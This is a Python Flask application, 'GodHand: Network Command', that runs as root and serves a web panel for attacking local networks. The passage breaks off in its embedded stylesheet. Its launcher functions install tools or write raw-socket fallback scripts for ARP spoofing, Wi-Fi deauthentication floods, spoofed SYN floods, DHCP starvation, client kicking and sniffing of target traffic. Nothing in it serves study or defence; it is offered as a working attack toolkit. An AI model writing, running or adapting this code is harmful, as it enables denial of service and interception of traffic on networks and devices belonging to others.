#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GodHand: Network Command – network control centre
Run as root.
"""

import os
import sys
import subprocess
import time
import json
import re
import threading
import socket
import struct
import fcntl
import random
import select
import ipaddress
import tempfile
import hashlib
import textwrap
from functools import wraps
from flask import Flask, request, jsonify, render_template_string, abort

# ---------- configuration ----------
SECRET = os.environ.get('GODHAND_SECRET', '')  # if set, require this token
APP_PORT = int(os.environ.get('GODHAND_PORT', 5000))

# ---------- global state with thread lock ----------
STATE = {
    'interface': None,
    'gateway': None,
    'port': 80,
    'targets': [],
    'hosts': [],
    'attack_pids': {},          # weapon_id -> list of Popen objects
    'attack_status': {},        # weapon_id -> 'running' or 'dead'
    'blocked_macs': set(),
    'monitor_log': [],
    'monitor_log_path': None,
    'log': [],                  # server-side activity log
    'status': 'Ready'
}
STATE_LOCK = threading.Lock()

def update_state(key, value):
    with STATE_LOCK:
        STATE[key] = value

def get_state(key):
    with STATE_LOCK:
        return STATE.get(key)

def add_to_list(key, value):
    with STATE_LOCK:
        STATE[key].append(value)

def remove_from_list(key, value):
    with STATE_LOCK:
        if value in STATE[key]:
            STATE[key].remove(value)

def add_to_set(key, value):
    with STATE_LOCK:
        STATE[key].add(value)

def discard_from_set(key, value):
    with STATE_LOCK:
        STATE[key].discard(value)

# ---------- server-side logging ----------
def add_log(level, msg):
    entry = {
        'time': time.strftime('%H:%M:%S'),
        'level': level,
        'msg': msg
    }
    with STATE_LOCK:
        STATE['log'].append(entry)
        STATE['log'] = STATE['log'][-200:]
    print(f"[{level.upper()}] {msg}")

# ---------- authentication ----------
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if SECRET:
            token = request.headers.get('Authorization', '').replace('Bearer ', '')
            if not token:
                token = request.args.get('token', '')
            if token != SECRET:
                abort(401, description='Unauthorized')
        return f(*args, **kwargs)
    return decorated

app = Flask(__name__)

# ---------- tool management ----------
_INSTALLED_TOOLS = set()
_INSTALL_ATTEMPTED = set()

def detect_package_manager():
    if os.path.exists('/data/data/com.termux'):
        return ('pkg', 'install', '-y')
    if subprocess.call(['which', 'apt-get'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('apt-get', 'install', '-y')
    if subprocess.call(['which', 'pacman'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('pacman', '-S', '--noconfirm')
    if subprocess.call(['which', 'dnf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('dnf', 'install', '-y')
    if subprocess.call(['which', 'brew'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('brew', 'install')
    return None

def install_package(pkg_name):
    if pkg_name in _INSTALL_ATTEMPTED:
        return pkg_name in _INSTALLED_TOOLS
    _INSTALL_ATTEMPTED.add(pkg_name)
    pm = detect_package_manager()
    if pm is None:
        add_log('error', f'No package manager found; cannot install {pkg_name}')
        return False
    cmd = list(pm) + [pkg_name]
    try:
        add_log('info', f'Installing {pkg_name} ...')
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _INSTALLED_TOOLS.add(pkg_name)
        return True
    except:
        add_log('error', f'Failed to install {pkg_name}')
        return False

def ensure_tool(tool_name, package_name=None):
    if tool_exists(tool_name):
        return True
    if package_name is None:
        package_name = tool_name
    pkg_map = {
        'arpspoof': 'dsniff',
        'aireplay-ng': 'aircrack-ng',
        'mdk4': 'mdk4',
        'hping3': 'hping3',
        'dhcpig': 'dhcpig',
        'iw': 'iw',
        'iptables': 'iptables',
    }
    pkg = pkg_map.get(package_name, package_name)
    return install_package(pkg) and tool_exists(tool_name)

def tool_exists(name):
    return subprocess.call(['which', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

# ---------- network helpers ----------
def get_my_ip_and_cidr(iface):
    try:
        out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show', iface], text=True)
        for line in out.splitlines():
            if 'inet ' in line:
                parts = line.split()
                ip_cidr = parts[3]
                return ip_cidr.split('/')
    except:
        pass
    return ('0.0.0.0', '24')

def get_mac(iface):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode()))
        s.close()
        return info[18:24].hex(':')
    except:
        return '00:00:00:00:00:00'

def arp_scan(iface, my_ip, cidr):
    results = []
    net = ipaddress.IPv4Network(f'{my_ip}/{cidr}', strict=False)
    src_mac = bytes.fromhex(get_mac(iface).replace(':', ''))

    def arp_packet(src_mac, src_ip, dst_ip):
        eth = b'\xff' * 6 + src_mac + struct.pack('!H', 0x0806)
        arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, 1)
        arp += src_mac + socket.inet_aton(src_ip)
        arp += b'\x00' * 6 + socket.inet_aton(dst_ip)
        return eth + arp

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind((iface, 0))
    sock.setblocking(0)

    hosts = [str(h) for h in net.hosts()]
    for ip in hosts:
        try:
            sock.send(arp_packet(src_mac, my_ip, ip))
        except:
            pass

    deadline = time.time() + 4
    seen = {}
    while time.time() < deadline:
        r, _, _ = select.select([sock], [], [], 0.1)
        if r:
            data, _ = sock.recvfrom(65535)
            if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
                if struct.unpack('!H', data[20:22])[0] == 2:
                    sip = socket.inet_ntoa(data[28:32])
                    smac = data[22:28]
                    if sip != my_ip and smac != b'\x00' * 6:
                        mac = smac.hex(':')
                        if sip not in seen:
                            seen[sip] = mac
                            results.append({'ip': sip, 'mac': mac})
    sock.close()
    return results

def get_gateway_mac(iface, gateway_ip):
    try:
        out = subprocess.check_output(['ip', 'neigh', 'show', gateway_ip], text=True)
        m = re.search(r'(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', out)
        if m:
            return m.group(1)
    except:
        pass
    my_ip, cidr = get_my_ip_and_cidr(iface)
    hosts = arp_scan(iface, my_ip, cidr)
    for h in hosts:
        if h['ip'] == gateway_ip:
            return h['mac']
    return None

def server_ping(ip, timeout=1):
    try:
        subprocess.check_output(['ping', '-c', '1', '-W', str(timeout), ip],
                                stderr=subprocess.DEVNULL, timeout=timeout+1)
        return True
    except:
        return False

def server_tcp_connect(ip, port, timeout=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except:
        return False

# ---------- monitor mode ----------
def set_monitor(iface, enable=True, raise_on_fail=False):
    mode = 'monitor' if enable else 'managed'
    try:
        subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
                       check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        if enable:
            time.sleep(0.5)
            out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True)
            if 'type monitor' not in out:
                raise RuntimeError(f'Failed to set monitor mode on {iface}')
        return True
    except Exception as e:
        if raise_on_fail:
            raise RuntimeError(str(e))
        return False

# ---------- checksum helpers ----------
def ip_checksum(data):
    if len(data) % 2 == 1:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def tcp_checksum(ip_src, ip_dst, tcp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00' + struct.pack('!B', 6) + struct.pack('!H', len(tcp_segment))
    checksum_data = psh + tcp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def udp_checksum(ip_src, ip_dst, udp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00' + struct.pack('!B', 17) + struct.pack('!H', len(udp_segment))
    checksum_data = psh + udp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# ---------- attack launchers ----------
def start_attack_arp_freeze(targets, gateway, iface):
    add_log('info', f'Starting ARP Freeze on {iface} for {len(targets)} targets')
    pids = []
    if ensure_tool('arpspoof', 'dsniff'):
        for t in targets:
            cmd = ['arpspoof', '-i', iface, '-t', t, gateway]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError(f'arpspoof failed for target {t}')
            pids.append(proc)
        for t in targets:
            cmd = ['arpspoof', '-i', iface, '-t', gateway, t]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError(f'arpspoof failed for gateway {gateway}')
            pids.append(proc)
        return pids
    else:
        fake_mac = get_mac(iface).replace(':', '')
        script = textwrap.dedent(f"""
            import socket, struct, time, sys
            IFACE = '{iface}'
            GATEWAY = '{gateway}'
            TARGETS = {targets}
            FAKE = bytes.fromhex('{fake_mac}')
            def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
                try:
                    eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
                    arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
                    arp += src_mac + socket.inet_aton(src_ip)
                    arp += dst_mac + socket.inet_aton(dst_ip)
                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                    s.bind((IFACE, 0))
                    s.send(eth + arp)
                    s.close()
                except Exception as e:
                    print(e, file=sys.stderr)
            while True:
                for t in TARGETS:
                    send_arp(2, GATEWAY, t, FAKE, b'\\xff'*6)
                    send_arp(2, t, GATEWAY, FAKE, b'\\xff'*6)
                time.sleep(0.5)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('ARP fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_deauth(targets, iface):
    add_log('info', f'Starting Deauth Flood on {iface} for {len(targets)} targets')
    if not set_monitor(iface, True, raise_on_fail=True):
        raise RuntimeError('Failed to enable monitor mode')
    pids = []
    gateway_mac = get_gateway_mac(iface, STATE['gateway']) if STATE['gateway'] else None

    if ensure_tool('aireplay-ng', 'aircrack-ng'):
        if targets and gateway_mac:
            for t_ip in targets:
                t_mac = None
                for h in STATE['hosts']:
                    if h['ip'] == t_ip:
                        t_mac = h['mac']
                        break
                if t_mac:
                    cmd = ['aireplay-ng', '-0', '0', '-a', gateway_mac, '-c', t_mac, iface]
                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                    time.sleep(0.1)
                    if proc.poll() is not None:
                        continue
                    pids.append(proc)
        if not pids:
            cmd = ['aireplay-ng', '-0', '0', '-a', 'FF:FF:FF:FF:FF:FF', iface]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError('aireplay-ng broadcast deauth failed')
            pids.append(proc)
        return pids
    elif ensure_tool('mdk4'):
        cmd = ['mdk4', iface, 'd', '-c', '100']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(0.1)
        if proc.poll() is not None:
            raise RuntimeError('mdk4 deauth failed')
        pids.append(proc)
        return pids
    else:
        script = textwrap.dedent(f"""
            import socket, struct, time
            IFACE = '{iface}'
            radiotap = b'\\x00\\x00\\x0e\\x00\\x04\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
            def deauth_packet(dst, bssid, seq):
                frame_control = b'\\xc0\\x00'
                duration = b'\\x00\\x00'
                seq_control = struct.pack('<H', seq & 0xfff)
                reason = struct.pack('<H', 7)
                frame = frame_control + duration + dst + bssid + bssid + seq_control + reason
                return radiotap + frame
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((IFACE, 0))
            seq = 0
            bssid = b'\\xff'*6
            while True:
                sock.send(deauth_packet(b'\\xff'*6, bssid, seq))
                seq = (seq + 1) & 0xfff
                time.sleep(0.1)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('Deauth fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_syn_flood(targets, port, iface):
    add_log('info', f'Starting SYN Flood on {iface}:{port} for {len(targets)} targets')
    pids = []
    if ensure_tool('hping3'):
        for t in targets:
            cmd = ['hping3', '-S', '-p', str(port), '--flood', '--rand-source', t]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                continue
            pids.append(proc)
        if not pids:
            raise RuntimeError('No hping3 processes started')
        return pids
    else:
        script = textwrap.dedent(f"""
            import socket, struct, random, time, sys
            TARGETS = {targets}
            PORT = {port}
            def tcp_checksum(ip_src, ip_dst, tcp_segment):
                psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\\x00' + struct.pack('!B', 6) + struct.pack('!H', len(tcp_segment))
                checksum_data = psh + tcp_segment
                if len(checksum_data) % 2 == 1:
                    checksum_data += b'\\x00'
                s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
                s = (s >> 16) + (s & 0xffff)
                s += s >> 16
                return ~s & 0xffff
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while True:
                for t in TARGETS:
                    try:
                        src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
                        iph = b'\\x45\\x00\\x00\\x28' + struct.pack('!H', random.randint(0,65535)) + b'\\x40\\x00\\x40\\x06\\x00\\x00'
                        iph += socket.inet_aton(src_ip) + socket.inet_aton(t)
                        tcp = struct.pack('!HHIIBBHHH', random.randint(1024,65535), PORT, 0,0, 0x50,0x02, 5840,0,0)
                        tcp = tcp[:16] + struct.pack('!H', tcp_checksum(src_ip, t, tcp)) + tcp[18:]
                        pkt = iph + tcp
                        s.sendto(pkt, (t,0))
                    except Exception as e:
                        pass
                time.sleep(0.01)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('SYN flood fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_dhcp_storm(targets, gateway, iface):
    add_log('info', f'Starting DHCP Storm on {iface} targeting DHCP server {gateway}')
    pids = []
    if ensure_tool('dhcpig'):
        cmd = ['dhcpig', '-i', iface, '-t', gateway, '-s', '1000']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(0.1)
        if proc.poll() is not None:
            raise RuntimeError('dhcpig failed to start')
        pids.append(proc)
        return pids
    else:
        script = textwrap.dedent(f"""
            import socket, struct, random, time
            IFACE = '{iface}'
            GATEWAY = '{gateway}'
            our_mac = bytes.fromhex('{get_mac(iface).replace(':','')}')
            BROADCAST = '255.255.255.255'
            def udp_checksum(ip_src, ip_dst, udp_segment):
                psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\\x00' + struct.pack('!B', 17) + struct.pack('!H', len(udp_segment))
                checksum_data = psh + udp_segment
                if len(checksum_data) % 2 == 1:
                    checksum_data += b'\\x00'
                s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
                s = (s >> 16) + (s & 0xffff)
                s += s >> 16
                return ~s & 0xffff
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while True:
                src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
                iph = b'\\x45\\x00\\x01\\x10' + struct.pack('!H', random.randint(0,65535)) + b'\\x00\\x00\\x40\\x11\\x00\\x00'
                iph += socket.inet_aton(src_ip) + socket.inet_aton(BROADCAST)
                udp = struct.pack('!HHH', 68, 67, 0x0100)
                udp = udp + b'\\x00\\x00'
                dhcp = b'\\x01\\x01\\x06\\x00'
                dhcp += struct.pack('!I', random.randint(0, 2**32 - 1))
                dhcp += b'\\x00\\x00\\x00\\x00'
                dhcp += socket.inet_aton('0.0.0.0') * 4
                dhcp += our_mac + b'\\x00' * 10
                dhcp += b'\\x00' * 192
                dhcp += b'\\x63\\x82\\x53\\x63'
                dhcp += struct.pack('BB', 53, 1) + b'\\x01'
                dhcp += struct.pack('BB', 61, 7) + b'\\x01' + our_mac
                dhcp += b'\\xff'
                dhcp += b'\\x00' * (256 - len(dhcp))
                udp = udp[:4] + struct.pack('!H', udp_checksum(src_ip, BROADCAST, udp + dhcp)) + udp[6:]
                pkt = iph + udp + dhcp
                s.sendto(pkt, (BROADCAST, 67))
                time.sleep(0.2)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('DHCP storm fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_monitor(targets, port, iface):
    add_log('info', f'Starting Traffic Capture on {iface} for port {port}')
    if not set_monitor(iface, True, raise_on_fail=False):
        add_log('warn', 'Monitor mode could not be enabled; capture may be incomplete')
    fd, path = tempfile.mkstemp(suffix='.py')
    os.close(fd)
    log_path = f"/tmp/godhand_monitor_{int(time.time())}.log"
    script = textwrap.dedent(f"""
        import socket, struct, select, time, sys
        IFACE = '{iface}'
        TARGETS = {targets}
        PORT = {port}
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((IFACE,0))
        while True:
            r,_,_ = select.select([sock],[],[],0.5)
            if r:
                data = sock.recvfrom(65535)[0]
                if len(data)<14: continue
                if struct.unpack('!H',data[12:14])[0] != 0x0800: continue
                if len(data)<34: continue
                src_ip = socket.inet_ntoa(data[26:30]); dst_ip = socket.inet_ntoa(data[30:34])
                proto = data[23]
                if proto == 6 and len(data)>=54:
                    sp,dp = struct.unpack('!HH',data[34:38])
                    if sp==PORT or dp==PORT:
                        if src_ip in TARGETS: print(f"{{src_ip}} -> {{dst_ip}}:{{dp}}")
                        elif dst_ip in TARGETS: print(f"{{dst_ip}} <- {{src_ip}}:{{sp}}")
                elif proto == 17 and len(data)>=42:
                    sp,dp = struct.unpack('!HH',data[34:38])
                    if sp==PORT or dp==PORT:
                        if src_ip in TARGETS: print(f"{{src_ip}} -> {{dst_ip}}:{{dp}}")
                        elif dst_ip in TARGETS: print(f"{{dst_ip}} <- {{src_ip}}:{{sp}}")
                sys.stdout.flush()
    """)
    with open(path, 'w') as f:
        f.write(script)
    log_file = open(log_path, 'w')
    proc = subprocess.Popen(['python3', path], stdout=log_file, stderr=subprocess.PIPE)
    time.sleep(0.5)
    if proc.poll() is not None:
        raise RuntimeError('Monitor script exited immediately')
    update_state('monitor_log_path', log_path)
    threading.Thread(target=lambda: (proc.wait(), log_file.close(), os.unlink(path)), daemon=True).start()
    def update_monitor_log():
        last_pos = 0
        while proc.poll() is None:
            try:
                with open(log_path, 'r') as lf:
                    lf.seek(last_pos)
                    new_lines = lf.readlines()
                    last_pos = lf.tell()
                    if new_lines:
                        with STATE_LOCK:
                            STATE['monitor_log'] = (STATE['monitor_log'] + new_lines)[-100:]
            except:
                pass
            time.sleep(0.5)
    threading.Thread(target=update_monitor_log, daemon=True).start()
    return [proc]

def run_attack(weapon_id, targets, gateway, port, iface):
    if not targets:
        raise ValueError('No targets')
    if weapon_id == 1:
        return start_attack_arp_freeze(targets, gateway, iface)
    elif weapon_id == 2:
        return start_attack_deauth(targets, iface)
    elif weapon_id == 3:
        return start_attack_syn_flood(targets, port, iface)
    elif weapon_id == 4:
        return start_attack_dhcp_storm(targets, gateway, iface)
    elif weapon_id == 5:
        return start_attack_monitor(targets, port, iface)
    return None

def kill_attack(pids):
    for proc in pids:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            try:
                proc.kill()
            except:
                pass

# ---------- kick & block with verification ----------
def kick_client(ip, mac, iface):
    add_log('info', f'Attempting to kick {ip} ({mac})')
    if not set_monitor(iface, True, raise_on_fail=True):
        raise RuntimeError('Cannot enable monitor mode')
    if ensure_tool('aireplay-ng', 'aircrack-ng'):
        cmd = ['aireplay-ng', '-0', '5', '-a', 'FF:FF:FF:FF:FF:FF', '-c', mac, iface]
        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        if res.returncode != 0:
            raise RuntimeError('aireplay-ng deauth failed: ' + res.stderr.decode())
    else:
        script = textwrap.dedent(f"""
            import socket, struct, time
            IFACE = '{iface}'
            MAC = '{mac}'
            dst_mac = bytes.fromhex(MAC.replace(':', ''))
            radiotap = b'\\x00\\x00\\x0e\\x00\\x04\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
            def pkt(dst, seq):
                frame_control = b'\\xc0\\x00'
                duration = b'\\x00\\x00'
                seq_control = struct.pack('<H', seq & 0xfff)
                reason = struct.pack('<H', 7)
                bssid = b'\\xff'*6
                frame = frame_control + duration + dst + bssid + bssid + seq_control + reason
                return radiotap + frame
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((IFACE, 0))
            for i in range(20):
                sock.send(pkt(dst_mac, i))
                sock.send(pkt(b'\\xff'*6, i))
                time.sleep(0.05)
            sock.close()
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        res = subprocess.run(['python3', path], stderr=subprocess.PIPE, timeout=10)
        os.unlink(path)
        if res.returncode != 0:
            raise RuntimeError('Deauth fallback script failed')
    set_monitor(iface, False)
    time.sleep(2)
    reachable = server_ping(ip, timeout=1)
    if reachable:
        add_log('warn', f'Target {ip} is still responding to ping after kick')
        return False
    else:
        add_log('success', f'Target {ip} is not responding to ping after kick')
        return True

def block_mac(mac):
    if not mac:
        raise ValueError('No MAC')
    add_log('info', f'Toggling block for MAC {mac}')
    with STATE_LOCK:
        currently_blocked = mac in STATE['blocked_macs']
    if currently_blocked:
        r1 = subprocess.run(['iptables', '-D', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                            stderr=subprocess.PIPE, timeout=5)
        r2 = subprocess.run(['iptables', '-D', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                            stderr=subprocess.PIPE, timeout=5)
        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                               stderr=subprocess.PIPE, timeout=5)
        if check.returncode == 0:
            raise RuntimeError('Failed to remove iptables rule')
        discard_from_set('blocked_macs', mac)
        add_log('success', f'Unblocked {mac}')
        return False
    else:
        r1 = subprocess.run(['iptables', '-I', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                            stderr=subprocess.PIPE, timeout=5)
        r2 = subprocess.run(['iptables', '-I', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                            stderr=subprocess.PIPE, timeout=5)
        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                               stderr=subprocess.PIPE, timeout=5)
        if check.returncode != 0:
            raise RuntimeError('Failed to insert iptables rule')
        add_to_set('blocked_macs', mac)
        add_log('success', f'Blocked {mac}')
        return True

# ---------- Flask routes ----------
@app.route('/')
def index():
    # The entire HTML/CSS/JS is embedded as a raw string to avoid escape issues.
    html_template = r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>GodHand: Network Command</title>
<style>
:root {
  --bg-base: #0A0F14;
  --bg-elevated: #111820;
  --bg-inset: #0D131A;
  --border-subtle: #1E2A36;
  --border-strong: #2C3E50;
  --text-primary: #E6EDF3;
  --text-secondary: #9BAAB8;
  --text-disabled: #5A6B7A;
  --accent-primary: #38BDF8;
  --accent-secondary: #0EA5E9;
  --accent-tertiary: #7DD3FC;
  --success: #34D399;
  --warning: #FBBF24;
  --danger: #F87171;
  --info: #818CF8;
  --special: #C084FC;
  --glow-accent: rgba(56,189,248,0.15);
  --glow-danger: rgba(248,113,113,0.15);
  --glow-success: rgba(52,211,153,0.15);
  --radius: 12px;
  --shadow: 0 4px 12px rgba(0,0,0,0.3);
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  background: var(--bg-base);
  color: var(--text-primary);
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}
header {
  background: var(--bg-elevated);
  border-bottom: 1px solid var(--border-subtle);
  padding: 12px 16px;
  display: flex;
  align-items: center;
  gap: 12px;
  position: sticky;
  top: 0;
  z-index: 100;
}
.logo {
  display: flex;
  align-items: center;
  gap: 10px;
  font-weight: 700;
  font-size: 1.2rem;
  color: var(--text-primary);
  text-decoration: none;
}
.logo-icon {
  width: 32px;
  height: 32px;
  background: linear-gradient(135deg, #0EA5E9, #38BDF8);
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #04121C;
  font-weight: bold;
  font-size: 18px;
}
.status-indicator {
  margin-left: auto;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 0.9rem;
}
.status-dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: var(--success);
  box-shadow: 0 0 8px var(--success);
}
.status-dot.running {
  background: var(--danger);
  box-shadow: 0 0 8px var(--danger);
  animation: pulse 1.5s infinite;
}
@keyframes pulse {
  0% { opacity: 1; }
  50% { opacity: 0.3; }
  100% { opacity: 1; }
}
nav {
  background: var(--bg-elevated);
  border-bottom: 1px solid var(--border-subtle);
  display: flex;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
  padding: 0 8px;
}
nav button {
  background: none;
  border: none;
  color: var(--text-secondary);
  padding: 14px 16px;
  font-size: 0.9rem;
  cursor: pointer;
  white-space: nowrap;
  display: flex;
  align-items: center;
  gap: 6px;
  border-bottom: 3px solid transparent;
  transition: all 0.2s;
}
nav button.active {
  color: var(--accent-primary);
  border-bottom-color: var(--accent-primary);
}
nav button .icon {
  font-size: 1.2rem;
}
main {
  flex: 1;
  padding: 16px;
  max-width: 1200px;
  width: 100%;
  margin: 0 auto;
}
.tab-content {
  display: none;
}
.tab-content.active {
  display: block;
}
.card {
  background: var(--bg-elevated);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius);
  padding: 20px;
  margin-bottom: 16px;
  box-shadow: var(--shadow);
}
.card h2 {
  font-size: 1.2rem;
  margin-bottom: 4px;
  display: flex;
  align-items: center;
  gap: 8px;
}
.card .sub {
  color: var(--text-secondary);
  font-size: 0.85rem;
  margin-bottom: 16px;
}
.row {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin-bottom: 12px;
  align-items: center;
}
input, select, textarea {
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  color: var(--text-primary);
  border-radius: 8px;
  padding: 12px 14px;
  font-size: 1rem;
  font-family: inherit;
  transition: border 0.2s, box-shadow 0.2s;
}
input:focus, select:focus, textarea:focus {
  outline: none;
  border-color: var(--accent-primary);
  box-shadow: 0 0 0 3px var(--glow-accent);
}
input[type="text"], input[type="number"] { flex: 1; min-width: 120px; }
textarea { width: 100%; min-height: 80px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; }
.btn {
  background: var(--accent-primary);
  color: #04121C;
  border: none;
  border-radius: 8px;
  padding: 12px 20px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
  min-height: 44px;
}
.btn:hover { background: var(--accent-secondary); transform: translateY(-1px); }
.btn:active { transform: scale(0.98); }
.btn:disabled { opacity: 0.5; cursor: not-allowed; }
.btn.secondary {
  background: transparent;
  border: 1px solid var(--border-strong);
  color: var(--text-primary);
}
.btn.secondary:hover { background: var(--bg-inset); }
.btn.danger {
  background: var(--danger);
  color: #1A0A0A;
}
.btn.big {
  font-size: 1.1rem;
  padding: 14px 28px;
}
.weapon-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
  gap: 10px;
  margin: 16px 0;
}
.weapon-btn {
  background: var(--bg-inset);
  border: 2px solid var(--border-subtle);
  border-radius: var(--radius);
  padding: 16px;
  text-align: center;
  cursor: pointer;
  transition: all 0.2s;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 6px;
}
.weapon-btn:hover { border-color: var(--border-strong); }
